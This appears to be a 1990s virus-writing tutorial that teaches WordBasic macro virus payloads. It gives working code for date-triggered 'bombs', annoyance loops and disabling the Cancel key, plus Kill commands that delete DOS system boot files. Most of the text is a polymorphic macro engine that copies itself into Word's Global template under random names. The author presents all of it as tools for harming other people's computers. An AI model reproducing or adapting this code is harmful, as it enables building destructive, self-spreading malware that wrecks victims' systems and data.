<B>INTRO TO LIFE
----- -- ----</B></PRE>

<PRE>Yep, it's time again for another tutorial!  I got so much positive feedback(and these people
wouldn't leave me alone)so I decided to continue.  This time I will mostly be talking about
virus payloads as I presented the infection routines to you last time....  Oh yeah!  The question
about books on Word BAsic reached me a lot of times too!  Here's a book I've been told is
supposed to be good: &quot;BEGINNING WORDBASIC PROGRAMMING&quot;, ISBN: #1874416869.  Enjoy!

<B>PAYLOAD??  I'M LOST!
--------------------</B></PRE>

<PRE>Why are you reading this then?  The Payload is the bomb....The thing that does stuff besides
infecting....

<B>WHAT IS POSSIBLE?
-----------------</B></PRE>

<PRE>Well, there are a lot of things you can do... You can format harddrives,Crash word, Run
other proggies(dos virii) etc.  But, you don't want your virus to this every single time
it is run right?  So you need a check routine:

If Month(Now()) = 1 And Day(Now()) = 3 Then   'Easy right?
BOMB HERE

ELSE
'whatever

End IF

The easiest method to annoy a user is to send the following very frequently:

SendKeys &quot;%&quot;+&quot;{F4}&quot;

This has the effect of pressing alt+f4...The problem is that word still prompts to save.  Since
we are in the annoying stuff right now, there is another one:

Again:
MsgBox&quot;HAHAHAHAHA!&quot;
Goto Again

Mean isn't it....Imagine someone working and this thing popping up one day when he opens your
word document.  Since his template was infected, he will see this more often :)

<B>MEAN STUFF
---------</B></PRE>

<PRE>Ok, you can get a good kick out of the above, but what if you really want to get someone?  Yes,
you guessed it... There's even meaner stuff :)

ToolsCustomizeKeyboard .KeyCode = 27, .Category = 1, .Name = &quot;Cancel&quot;, .Remove, .Context = 0
'The above macro looks handy for the close all function :)  (To all who don't understand: It
'removes the cancel button!)

Kill&quot;C:\Autoexec.bat&quot;
Kill&quot;C:\Config.sys&quot;
Kill&quot;C:\Command.com&quot;
Kill&quot;C:\io.sys&quot;
Kill&quot;C:\msdos.sys&quot;
Finish:

Ain't this mean :)  I got the next one from the Nightmare Joker.  Enjoy....

ToolsCustomizeKeyboard .KeyCode = 27, .Category = 1, .Name = &quot;Cancel&quot;, .Remove, .Context = 0

SendKeys &quot;^&quot; + &quot;%&quot; + &quot;-&quot;

Close all documents and look under File....How's your Cursor doin'?

<B>POLYMORPHIC??
-------------</B></PRE>

<PRE>Yes, it is possible....  Here's a polymorphic engine which uses random names for its macros
to hide is indentity.  This code is from The Nightmare Joker!  I translated it into English:

Sub MAIN
On Error Goto Done

A$ = FileName$()
If A$ = &quot;&quot; Then Goto Finish

If VInstalled = 0 Then
        Run1
        Run2
        FileSaveAll 1, 1
Else
        Goto Done
End If

Done:
A$ = FileName$()
If A$ = &quot;&quot; Then
        Goto Finish
Else
        Insert &quot; &quot;
End If

Finish:
MsgBox &quot;polymorph&quot;, - 8
End Sub

Sub Run1
X$ = Fun$(F$, G$, H$, J$)
Y$ = Fun$(F$, G$, H$, J$)

Z$ = X$ + Y$

R1$ = GetDocumentVar$(&quot;VirNameDoc&quot;)
CO$ = FileName$() + &quot;:&quot; + R1$
MacroCopy CO$, &quot;Global:&quot; + Z$
SetProfileString &quot;Intl&quot;, &quot;Info2&quot;, Z$
ToolsCustomizeKeyboard .KeyCode = 65, .Category = 2, .Name = Z$, .Add, .Context = 0
End Sub

Sub Run2
X$ = Fun$(F$, G$, H$, J$)
Y$ = Fun$(F$, G$, H$, J$)

Z$ = X$ + Y$

R2$ = GetDocumentVar$(&quot;VirName&quot;)
OC$ = FileName$() + &quot;:&quot; + R2$
MacroCopy OC$, &quot;Global:&quot; + Z$
SetProfileString &quot;Intl&quot;, &quot;Info1&quot;, Z$
ToolsCustomizeKeyboard .KeyCode = 32, .Category = 2, .Name = Z$, .Add, .Context = 0
End Sub

Function VInstalled
CC$ = GetProfileString$(&quot;Intl&quot;, &quot;Info1&quot;)
        VInstalled = 0
        If CountMacros(0) &gt; 0 Then
                For i = 1 To CountMacros(0)
                If MacroName$(i, 0) = CC$ Then
                        VInstalled = 1
                End If
        Next i
End If
End Function

I'm going to leave you withou explination at this point because if you have no idea what this
is about, then this is nothing for you as a beginner!

<B>WHERE TO?
---------</B></PRE>

<PRE>I don't know when I will continue this, but I'm sure that if there are any news that I will gladly
continue.  As usual you can reach me at Dark_Night@ilf.net with any questions!  Also I would
appreciate any future topic suggestions!
